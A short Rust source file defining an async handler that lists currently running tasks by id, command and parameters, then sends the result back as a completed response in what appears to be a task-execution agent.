use crate::structs::Task;
use crate::tasks;

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let running = tasks::get_running_tasks();
    let mut output = format!("Running tasks: {}\n", running.len());
    for t in &running {
        output.push_str(&format!("  [{}] {} {}\n", t.id, t.command, t.params));
    }
    response.user_output = output;
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
